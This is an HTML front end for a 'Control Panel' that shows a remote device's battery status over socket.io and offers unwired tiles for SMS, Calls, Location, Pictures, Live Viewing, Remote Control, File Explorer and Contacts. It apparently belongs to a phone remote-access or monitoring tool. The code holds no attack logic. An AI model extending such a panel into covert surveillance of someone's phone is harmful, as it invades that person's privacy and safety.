<!DOCTYPE html>
<html>
<head>
    <title>Control Panel</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { 
            font-family: 'Segoe UI', sans-serif; 
            background: #000; 
            margin: 0; 
            display: flex; 
            flex-direction: column;
            align-items: center; 
            color: white; 
            min-height: 100vh;
        }

        /* TOP STATUS BAR - FIXED */
        .top-nav {
            position: fixed;
            top: 0; left: 0; width: 100%;
            height: 70px;
            background: #111;
            display: flex;
            justify-content: center;
            align-items: center;
            border-bottom: 1px solid #333;
            z-index: 2000;
        }

        .status-wrapper { display: flex; align-items: center; gap: 15px; }

        /* Battery Box Styling */
        .battery-box {
            padding: 8px 25px;
            border-radius: 10px;
            font-weight: bold;
            font-size: 1.8rem;
            min-width: 90px;
            text-align: center;
            transition: 0.4s;
        }
        .online { background-color: #90ee90; color: #006400; }
        .offline { background-color: #ffcccb; color: #8b0000; }

        .state-icon { font-size: 2rem; display: none; }
        #charging-icon { color: #f1c40f; } 
        #unplugged-icon { color: #2ecc71; }

        /* CENTERED MENU GRID */
        .menu-container {
            display: grid;
            /* Creates 3 columns for desktop, 2 for mobile */
            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
            gap: 20px;
            margin-top: 100px;
            margin-bottom: 50px;
            width: 90%;
            max-width: 900px;
        }

        /* Large Square Menu Box */
        .menu-box {
            background: #111;
            border: 1px solid #333;
            aspect-ratio: 1 / 1;
            border-radius: 15px; /* Small rounded corners */
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            color: inherit;
        }

        .menu-box:hover {
            background: #1a1a1a;
            border-color: #90ee90;
            transform: translateY(-5px);
            box-shadow: 0 10px 20px rgba(0,0,0,0.5);
        }

        .menu-box.active {
            border-color: #27ae60;
            background: #001a00;
        }

        .menu-logo {
            font-size: 3rem;
            margin-bottom: 12px;
        }

        .menu-name {
            font-size: 0.9rem;
            font-weight: bold;
            color: #aaa;
            text-transform: uppercase;
            letter-spacing: 1px;
            text-align: center;
            padding: 0 10px;
        }

        .menu-box:hover .menu-name { color: #fff; }

        h2.panel-title {
            margin-top: 100px;
            color: #555;
            letter-spacing: 3px;
        }
    </style>
</head>
<body>

    <div class="top-nav">
        <div class="status-wrapper">
            <div id="bat-box" class="battery-box offline">
                <span id="bat-pct">--</span>%
            </div>
            <span id="charging-icon" class="state-icon">‚ö°</span>
            <span id="unplugged-icon" class="state-icon">üîã</span>
        </div>
    </div>

    <h2 class="panel-title">CONTROL PANEL</h2>

    <div class="menu-container">
        <div class="menu-box active">
            <div class="menu-logo">üìä</div>
            <div class="menu-name">Dashboard</div>
        </div>
        <div class="menu-box">
            <div class="menu-logo">üí¨</div>
            <div class="menu-name">SMS</div>
        </div>
        <div class="menu-box">
            <div class="menu-logo">üìû</div>
            <div class="menu-name">Calls</div>
        </div>
        <div class="menu-box">
            <div class="menu-logo">üìç</div>
            <div class="menu-name">Location</div>
        </div>
        <div class="menu-box">
            <div class="menu-logo">üñºÔ∏è</div>
            <div class="menu-name">Pictures</div>
        </div>
        <div class="menu-box">
            <div class="menu-logo">üåê</div>
            <div class="menu-name">Site Web</div>
        </div>
        <div class="menu-box">
            <div class="menu-logo">üéÆ</div>
            <div class="menu-name">Remote Control</div>
        </div>
        <div class="menu-box">
            <div class="menu-logo">üëÅÔ∏è</div>
            <div class="menu-name">Live Viewing</div>
        </div>
        <div class="menu-box">
            <div class="menu-logo">üìÇ</div>
            <div class="menu-name">File Explorer</div>
        </div>
        <div class="menu-box">
            <div class="menu-logo">üë§</div>
            <div class="menu-name">Contacts</div>
        </div>
    </div>

    <script>
        const socket = io();
        const batBox = document.getElementById('bat-box');
        const batPct = document.getElementById('bat-pct');
        const chargingIcon = document.getElementById('charging-icon');
        const unpluggedIcon = document.getElementById('unplugged-icon');

        socket.on('device-status', (status) => {
            if (status.online) {
                batBox.className = "battery-box online";
            } else {
                batBox.className = "battery-box offline";
                batPct.innerText = "--";
                chargingIcon.style.display = "none";
                unpluggedIcon.style.display = "none";
            }
        });

        socket.on('ui-battery', (data) => {
            let finalPercent;
            let isCharging = false;

            if (typeof data === 'object' && data !== null) {
                finalPercent = data.percent;
                isCharging = data.charging;
            } else {
                finalPercent = data;
            }

            batPct.innerText = finalPercent;
            batBox.className = "battery-box online";

            if (isCharging) {
                chargingIcon.style.display = "inline";
                unpluggedIcon.style.display = "none";
            } else {
                chargingIcon.style.display = "none";
                unpluggedIcon.style.display = "inline";
            }
        });
    </script>
</body>
</html>
